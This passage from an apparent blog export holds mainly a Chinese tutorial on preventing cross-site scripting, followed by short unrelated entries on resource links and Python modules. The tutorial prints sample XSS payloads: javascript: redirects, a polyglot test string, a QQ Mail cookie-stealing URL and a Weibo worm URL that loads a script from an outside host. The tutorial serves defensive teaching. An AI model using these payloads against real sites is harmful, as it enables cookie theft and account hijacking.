小明欲哭无泪，在判断 URL 开头是否为 javascript: 时，先把用户输入转成了小写，然后再进行比对。 不过，所谓“道高一尺，魔高一丈”。面对小明的防护策略，安全组就构造了这样一个连接： 1http://xxx/?redirect_to=%20javascript:alert(&apos;XSS&apos;) %20javascript:alert(&#39;XSS&#39;) 经过 URL 解析后变成 javascript:alert(&#39;XSS&#39;)，这个字符串以空格开头。这样攻击者可以绕过后端的关键词规则，又成功的完成了注入。 最终，小明选择了白名单的方法，彻底解决了这个漏洞： 1234567891011121314// 根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等allowSchemes = ["http", "https"];valid = isValid(getParameter("redirect_to"), allowSchemes);if (valid) &#123; &lt;a href="&lt;%= escapeHTML(getParameter("redirect_to"))%&gt;"&gt; 跳转... &lt;/a&gt;&#125; else &#123; &lt;a href="/404"&gt; 跳转... &lt;/a&gt;&#125; 通过这个事件，小明学习到了如下知识： 做了 HTML 转义，并不等于高枕无忧。 对于链接跳转，如 &lt;a href=&quot;xxx&quot; 或 location.href=&quot;xxx&quot;，要检验其内容，禁止以 javascript: 开头的链接，和其他非法的 scheme。 根据上下文采用不同的转义规则某天，小明为了加快网页的加载速度，把一个数据通过 JSON 的方式内联到 HTML 中： 123&lt;script&gt; var initData = &lt;%= data.toJSON() %&gt;&lt;/script&gt; 插入 JSON 的地方不能使用 escapeHTML()，因为转义 &quot; 后，JSON 格式会被破坏。 但安全组又发现有漏洞，原来这样内联 JSON 也是不安全的： 当 JSON 中包含 U+2028 或 U+2029 这两个字符时，不能作为 JavaScript 的字面量使用，否则会抛出语法错误。 当 JSON 中包含字符串 &lt;/script&gt; 时，当前的 script 标签将会被闭合，后面的字符串内容浏览器会按照 HTML 进行解析；通过增加下一个 &lt;script&gt; 标签等方法就可以完成注入。 于是我们又要实现一个 escapeEmbedJSON() 函数，对内联 JSON 进行转义。 转义规则如下： |字符|转义后的字符| |-|-| |U+2028|\u2028| |U+2029|\u2029| |&lt;|\u003c| 修复后的代码如下： 12&lt;script&gt;var initData = &lt;%= escapeEmbedJSON(data.toJSON()) %&gt; 通过这个事件，小明学习到了如下知识： HTML 转义是非常复杂的，在不同的情况下要采用不同的转义规则。如果采用了错误的转义规则，很有可能会埋下 XSS 隐患。 应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。 漏洞总结小明的例子讲完了，下面我们来系统的看下 XSS 有哪些注入的方法： 在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。 在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。 在标签的 href、src 等属性中，包含 javascript: 等可执行代码。 在 onload、onerror、onclick 等事件中，注入不受控制代码。 在 style 属性和标签中，包含类似 background-image:url(&quot;javascript:...&quot;); 的代码（新版本浏览器已经可以防范）。 在 style 属性和标签中，包含类似 expression(...) 的 CSS 表达式代码（新版本浏览器已经可以防范）。 总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。 XSS 攻击的分类通过上述几个例子，我们已经对 XSS 有了一些认识。 什么是 XSSCross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。 为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。 XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。 而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。 在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。 这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？ 不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信： 来自用户的 UGC 信息 来自第三方的链接 URL 参数 POST 参数 Referer （可能来自不可信的来源） Cookie （可能来自其他子域注入） XSS 分类根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。 |类型|存储区|插入点| |-|-| |存储型 XSS|后端数据库|HTML| |反射型 XSS|URL|HTML| |DOM 型 XSS|后端数据库/前端存储/URL|前端 JavaScript| 存储区：恶意代码存放的位置。 插入点：由谁取得恶意代码，并插入到网页上。 存储型 XSS存储型 XSS 的攻击步骤： 攻击者将恶意代码提交到目标网站的数据库中。 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。 反射型 XSS反射型 XSS 的攻击步骤： 攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。 反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。 由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。 POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。 DOM 型 XSSDOM 型 XSS 的攻击步骤： 攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL。 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。 XSS 攻击的预防通过前面的介绍可以得知，XSS 攻击有两大要素： 攻击者提交恶意代码。 浏览器执行恶意代码。 针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？ 输入过滤在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？ 答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。 那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？ 我们举一个例子，一个正常的用户输入了 5 &lt; 7 这个内容，在写入数据库前，被转义，变成了 5 &amp;lt; 7。 问题是：在提交阶段，我们并不确定内容要输出到哪里。 这里的“并不确定内容要输出到哪里”有两层含义： 用户的输入内容可能同时提供给前端和客户端，而一旦经过了 escapeHTML()，客户端显示的内容就变成了乱码( 5 &amp;lt; 7 )。 在前端中，不同的位置所需的编码也不同。 当 5 &amp;lt; 7 作为 HTML 拼接页面时，可以正常显示： 1&lt;div title="comment"&gt;5 &amp;lt; 7&lt;/div&gt; 当 5 &amp;lt; 7 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。 所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。 当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。 既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类： 防止 HTML 中出现注入。 防止 JavaScript 执行时，执行恶意代码。 预防存储型和反射型 XSS 攻击存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。 预防这两种漏洞，有两种常见做法： 改成纯前端渲染，把代码和数据分隔开。 对 HTML 做充分转义。 纯前端渲染纯前端渲染的过程： 浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。 然后浏览器执行 HTML 中的 JavaScript。 JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。 在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。 但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 onload 事件和 href 中的 javascript:xxx 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。 在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。 转义 HTML如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。 常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 &amp; &lt; &gt; &quot; &#39; / 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善： |XSS 安全漏洞|简单转义是否有防护作用| |-|-| |HTML 标签文字内容|有| |HTML 属性值|有| |CSS 内联样式|无| |内联 JavaScript|无| |内联 JSON|无| |跳转链接|无| 所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。 例如 Java 工程里，常用的转义库为 org.owasp.encoder。以下代码引用自 org.owasp.encoder 的官方说明。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!-- HTML 标签内文字内容 --&gt;&lt;div&gt;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&lt;/div&gt;&lt;!-- HTML 标签属性值 --&gt;&lt;input value="&lt;%= Encode.forHtml(UNTRUSTED) %&gt;" /&gt;&lt;!-- CSS 属性值 --&gt;&lt;div style="width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;"&gt; &lt;!-- CSS URL --&gt; &lt;div style="background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;"&gt; &lt;!-- JavaScript 内联代码块 --&gt; &lt;script&gt; var msg = '&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;'; alert(msg); &lt;/script&gt; &lt;!-- JavaScript 内联代码块内嵌 JSON --&gt; &lt;script&gt; var __INITIAL_STATE__ = JSON.parse( '&lt;%= Encoder.forJavaScript(data.to_json) %&gt;' ); &lt;/script&gt; &lt;!-- HTML 标签内联监听器 --&gt; &lt;button onclick="alert('&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;');"&gt; click me &lt;/button&gt; &lt;!-- URL 参数 --&gt; &lt;a href="/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top" &gt; &lt;!-- URL 路径 --&gt; &lt;a href="/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;"&gt; &lt;!-- URL. 注意：要根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等--&gt; &lt;a href='&lt;%= urlValidator.isValid(UNTRUSTED) ? Encode.forHtml(UNTRUSTED) : "/404"%&gt;' &gt; link &lt;/a&gt;&lt;/a &gt;&lt;/a &gt; &lt;/div&gt;&lt;/div&gt; 可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。 预防 DOM 型 XSS 攻击DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。 在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute()等。 如果用 Vue/React 技术栈，并且不使用 v-html/dangerouslySetInnerHTML 功能，就在前端 render 阶段避免 innerHTML、outerHTML 的 XSS 隐患。 DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，&lt;a&gt; 标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。 1234567891011121314151617&lt;!-- 内联事件监听器中包含恶意代码 --&gt;![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/3e724ce0.data:image/png,)&lt;!-- 链接内包含恶意代码 --&gt;&lt;a href="UNTRUSTED"&gt;1&lt;/a&gt;&lt;script&gt; // setTimeout()/setInterval() 中调用恶意代码 setTimeout('UNTRUSTED'); setInterval('UNTRUSTED'); // location 调用恶意代码 location.href = 'UNTRUSTED'; // eval() 中调用恶意代码 eval('UNTRUSTED');&lt;/script&gt; 如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。 其他 XSS 防范措施虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。 Content Security Policy严格的 CSP 在 XSS 的防范中可以起到以下的作用： 禁止加载外域代码，防止复杂的攻击逻辑。 禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。 合理使用上报可以及时发现 XSS，利于尽快修复问题。 关于 CSP 的详情，请关注前端安全系列后续的文章。 输入内容长度控制对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。 其他安全措施 HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。 验证码：防止脚本冒充用户提交危险操作。 XSS 的检测上述经历让小明收获颇丰，他也学会了如何去预防和修复 XSS 漏洞，在日常开发中也具备了相关的安全意识。但对于已经上线的代码，如何去检测其中有没有 XSS 漏洞呢？ 经过一番搜索，小明找到了两个方法： 使用通用 XSS 攻击字符串手动检测 XSS 漏洞。 使用扫描工具自动检测 XSS 漏洞。 在Unleashing an Ultimate XSS Polyglot一文中，小明发现了这么一个字符串： 1jaVasCript: /*-/*`/*\`/*'/*"/**/ /* */ oNcliCk = alert(); //%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e 它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write() 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。 小明只要在网站的各输入框中提交这个字符串，或者把它拼接到 URL 参数上，就可以进行检测了。 1http://xxx/search?keyword=jaVasCript%3A%2F*-%2F*%60%2F*%60%2F*%27%2F*%22%2F**%2F(%2F*%20*%2FoNcliCk%3Dalert()%20)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%3CsVg%2F%3CsVg%2FoNloAd%3Dalert()%2F%2F%3E%3E 除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 Arachni、Mozilla HTTP Observatory、w3af 等。 XSS 攻击的总结我们回到最开始提出的问题，相信同学们已经有了答案： XSS 防范是后端 RD 的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。 不正确。因为： _ 防范存储型和反射型 XSS 是后端 RD 的责任。而 DOM 型 XSS 攻击不发生在后端，是前端 RD 的责任。防范 XSS 是需要后端 RD 和前端 RD 共同参与的系统工程。 _ 转义应该在输出 HTML 时进行，而不是在提交用户输入时。 所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。 不正确。 不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 业务 RD 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。 整体的 XSS 防范是非常复杂和繁琐的，我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。 虽然很难通过技术手段完全避免 XSS，但我们可以总结以下原则减少漏洞的产生： 利用模板引擎 开启模板引擎自带的 HTML 转义功能。例如： 在 ejs 中，尽量使用 &lt;%= data %&gt; 而不是 &lt;%- data %&gt; 。 避免内联事件 尽量不要使用 onLoad=&quot;onload(&#39;&#39;)&quot;、onClick=&quot;go(&#39;&#39;)&quot; 这种拼接内联事件的写法。在 JavaScript 中通过 .addEventlistener() 事件绑定会更安全。 避免拼接 HTML 前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 createElement、setAttribute 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。 时刻保持警惕 在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。 增加攻击难度，降低攻击后果 通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。 主动检测和发现 可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。 XSS 攻击案例QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞攻击者发现 http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb 这个 URL 的参数 uin、domain 未经转义直接输出到 HTML 中。 于是攻击者构建出一个 URL，并引导用户去点击： http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B 用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中： 123456789&lt;script&gt; getTop().location.href = '/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa' + '&amp;t=' + '&amp;d=bbbb'; return false;&lt;/script&gt;&lt;script&gt; alert(document.cookie);&lt;/script&gt;"+"... 浏览器接收到响应后就会执行 alert(document.cookie)，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。 新浪微博名人堂反射型 XSS 漏洞攻击者发现 http://weibo.com/pub/star/g/xyyyd 这个 URL 的内容未经过滤直接输出到 HTML 中。 于是攻击者构建出一个 URL，然后诱导用户去点击： 1http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt; 用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中： 1&lt;li&gt;&lt;a href="http://weibo.com/pub/star/g/xyyyd"&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;"&gt;按分类检索&lt;/a&gt;&lt;/li&gt; 浏览器接收到响应后就会加载执行恶意脚本 //xxxx.cn/image/t.js，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。 扩展阅读：Automatic Context-Aware Escaping上文我们说到： 合适的 HTML 转义可以有效避免 XSS 漏洞。 完善的转义库需要针对上下文制定多种规则，例如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等等。 业务 RD 需要根据每个插入点所处的上下文，选取不同的转义规则。 通常，转义库是不能判断插入点上下文的（Not Context-Aware），实施转义规则的责任就落到了业务 RD 身上，需要每个业务 RD 都充分理解 XSS 的各种情况，并且需要保证每一个插入点使用了正确的转义规则。 这种机制工作量大，全靠人工保证，很容易造成 XSS 漏洞，安全人员也很难发现隐患。 2009 年，Google 提出了一个概念叫做：Automatic Context-Aware Escaping。 所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。 在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则： 123456789&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;title&gt;&#123;&#123;.title&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href="&#123;&#123;.url&#125;&#125;"&gt;&#123;&#123;.content&#125;&#125;&lt;/a&gt; &lt;/body&gt;&lt;/html&gt; 模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则： 123456789&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;title&gt;&#123;&#123;.title | htmlescaper&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href="&#123;&#123;.url | urlescaper | attrescaper&#125;&#125;"&gt;&#123;&#123;.content | htmlescaper&#125;&#125;&lt;/a&gt; &lt;/body&gt;&lt;/html&gt; 目前已经支持 Automatic Context-Aware Escaping 的模板引擎有： go html/template Google Closure Templates 课后作业：XSS 攻击小游戏以下是几个 XSS 攻击小游戏，开发者在网站上故意留下了一些常见的 XSS 漏洞。玩家在网页上提交相应的输入，完成 XSS 攻击即可通关。 在玩游戏的过程中，请各位读者仔细思考和回顾本文内容，加深对 XSS 攻击的理解。 alert(1) to win prompt(1) to win XSS game 参考文献 Wikipedia. Cross-site scripting, Wikipedia. OWASP. XSS (Cross Site Scripting) Prevention Cheat Sheet, OWASP. OWASP. Use the OWASP Java Encoder-Use-the-OWASP-Java-Encoder), GitHub. Ahmed Elsobky. Unleashing an Ultimate XSS Polyglot, GitHub. Jad S. Boutros. Reducing XSS by way of Automatic Context-Aware Escaping in Template Systems, Google Security Blog. Vue.js. v-html - Vue API docs, Vue.js. React. dangerouslySetInnerHTML - DOM Elements, React.]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F09%2F08%2FAI%2FAI%20%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[1234title: AI 传送门date: 2019-09-8 24:50:24tags: AIcategories: AI Tensorflow Tensorflow.js 官方中文文档 tfjs-examples Deep Learning with JavaScript-Neural networks in TensorFlow.js]]></content>
  </entry>
  <entry>
    <title><![CDATA[前端传送门]]></title>
    <url>%2F2019%2F09%2F06%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[JavaScript 前端面试与进阶指南 壹题汇总 33 Concepts Every JavaScript Developer Should Know React react 官网 技术网址 淘系前端团队（FED） InfoQ IMWeb AlloyTeam 美团技术团队 大牛们的思考沉淀 阿里9年，我总结的前端架构演进3大阶段及团队管理心法 winter：从前端到”钱“端，我并不把钱当工作目标，但钱从来也没有亏待我 玉伯：我的前端成长之路]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出 Python 模块机制]]></title>
    <url>%2F2019%2F09%2F01%2FPython%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%20Python%20%E6%A8%A1%E5%9D%97%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[Python 模块 模块是包括 Python 定义和声明的文件，文件名就是模块名加上 .py 后缀，模块名可以由全局变量 __name__ 得到。 Python 只有一种模块对象类型，所有模块都属于该类型，无论模块是用 Python、C 还是别的语言实现。 什么是 Python 模块简单来说，一个 Python 模块就是一个以 .py 为后缀的文件 ，模块中能定义内容包括：变量、函数、类和可执行代码。 模块类型大致有以下 3 种： Python 内置的模块，即标准库。 Python 带有一个标准模块库，并发布有独立的文档，名为 Python 库参考手册。有一些模块内置于解释器之中，这些操作的访问接口不是语言内核的一部分，但是已经内置于解释器了。这既是为了提高效率，也是为了给系统调用等操作系统原生访问提供接口。 第三方模块，即通过 pip install 的模块。 自定义模块，即用户自己编写的模块。 举个 🌰，我们写一个模块 fibo.py ： 1234567891011121314# write Fibonacci series up to ndef fib(n): a, b = 0, 1 while a &lt; n: print(a) a, b = b, a+b# return Fibonacci series up to ndef fib2(n): result = [] a, b = 0, 1 while a &lt; n: result.append(a) a, b = b, a+b 模块导入导入模块的方式有以下 2 种： import module 这是模块 完全引入 的方式。 比如 import os 会把 os 下面的所有的变量、函数、类全部引入，通过 os 可以访问模块中的变量或函数，如 os.listdir()。 当然也可以通过 import module as xx 的方式，为模块起一个别名。 from module import func1, func2 这是模块 部分引入 的方式。按需引入需要模块中定义的函数，另一个好处是可以直接在脚本中使用复制后的变量名。 举个🌰，现在进入 Python 解释器导入该模块： 12&gt;&gt;&gt; import fibo&gt;&gt;&gt; 可以看到当前没有任何输出，因为导入模块的操作，只是进入到模块名 fibo 中，并不会直接进入到定义在 fibo 函数内。可以用模块名访问这些函数: 123456789&gt;&gt;&gt; import fibo&gt;&gt;&gt; fibo.fib(10)0112358 模块执行如果需要让一个 .py 文件既当作脚本又能当作模块用，可以使用 __name__ 这个属性。只有当文件被当作脚本执行的时候， __name__ 的值才会是 &#39;__main__&#39;，而模块导入时不会。 下面，我们改造一下上述 fibo 模块，在末尾添加一段代码： 123456789101112131415161718# write Fibonacci series up to ndef fib(n): a, b = 0, 1 while a &lt; n: print(a) a, b = b, a+b# return Fibonacci series up to ndef fib2(n): result = [] a, b = 0, 1 while a &lt; n: result.append(a) a, b = b, a+b# 作为脚本来执行模块if __name__ == &apos;__main__&apos; : fib(10) 然后运行 Python 模块： 12345678&gt;&gt;&gt; python fibo.py 0112358 可以看到模块里的代码会被执行，就好像已导入模块一样。 模块加载机制 动态加载模块但是import只能够加载固定名称模块，不能加载动态比如字符串名称模块，比如 str = ‘tools’import str 好了，现在解决了动态加载随意模块的问题了，但是距离成功还有一步之遥，在python里面，加载模块是有缓存的，意思就是说，加载tools.py之后，就算tools.py内容发生改变了，都不会重新加载，还是无法满足我们实时更新加载模块的需求。这里有个比较简单的办法，可以使得模块有需要的时候重新加载，回想之前我们说过，python加载后的模块都会保存在sys.modules里面，我们只需要在重新加载模块之前，把模块从sys.modules里面删除即可。 del sys.modules[‘tools’]import(‘tools’) Python 包 为了帮助组织模块并提供名称层次结构，Python 还引入了包的概念。可以把包看成是文件系统中的目录，并把模块看成是目录中的文件，但请不要对这个类似做过于字面的理解，因为包和模块不是必须来自于文件系统。 与文件系统一样，包通过层次结构进行组织，在包之内除了一般的模块，还可以有子包。 简单地来说，”包“ (package) 是含有 Python 模块的文件夹，不过前提条件是这个文件夹下必须存在 __init__.py 文件。 什么是 __init__.py 文件当文件夹下存在 __init__.py 文件时意味着该文件夹是一个包，__init__.py 文件用于组织包，管理各个模块之间的引用、控制包的导入行为。 封装包时确保每个目录都定义了一个 __init__.py 文件，举个🌰： 123456789├── package # 顶层目录├── init.py ├── subPackage1 # 子包 │ ├── init.py │ ├── module1 │ ├── module1 ├── subPackage2 # 子包 │ ├── init.py │ ├── module2 组织好目录结构和代码后，便可以执行以下 import 语句： 123import package.subPackage1.module1from package.subPackage1 import module1import package.subPackage2.module2 as module2 __init__.py 文件的目的是要包含不同运行级别的包的可选的初始化代码，导入一个包时会先导入的它的 __init__.py 文件并自动运行。 举个🌰，执行语句 import package.subPackage1.module1 时，文件 package/__init__.py 将被导入，建立 package 命名空间的内容，且 package/__init__.py 将在文件 package/subPackage1/__init__.py 导入之前导入。 一般情况下 __init__.py 文件可以为空，但是有的时候也可以在 __init__.py 中导入其他的包或模块： 12# package/subPackage1/__init__.pyfrom . import module1 于是就可以通过 import package.subPackage1 代替 import package.subPackage1.module1 来导入模块了。 包导入使用相对路径名导入包中子模块参考文档 【官方文档】— 导入系统 Python _init_.py 作用详解 Python源码剖析笔记3-Python执行原理初探]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node.js 参考资料传送门]]></title>
    <url>%2F2019%2F09%2F01%2FNode.js%2FNode.js%20%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[框架 egg koa express 技术网址 蚂蚁金服体验科技 NodeJS 技术人指路 【知乎Live】狼叔：如何正确的学习Node.js]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F08%2F21%2FPython%2Fpandas%20%E7%9A%84%20excel%20%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[用 python 做数据分析：pandas 的 excel 应用初探：https://zhuanlan.zhihu.com/p/32338530 Python实现EXCEL常用操作——pandas简介：https://zhuanlan.zhihu.com/p/34541791 XlsxWriter：https://xlsxwriter.readthedocs.io/ python 和 node.js 交互(node.js中执行python函数)：https://blog.csdn.net/qq_23057645/article/details/80967657]]></content>
  </entry>
  <entry>
    <title><![CDATA[js 引擎（一）]]></title>
    <url>%2F2019%2F08%2F18%2FWeb%E5%89%8D%E7%AB%AF%2Fjs%20%E5%BC%95%E6%93%8E%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
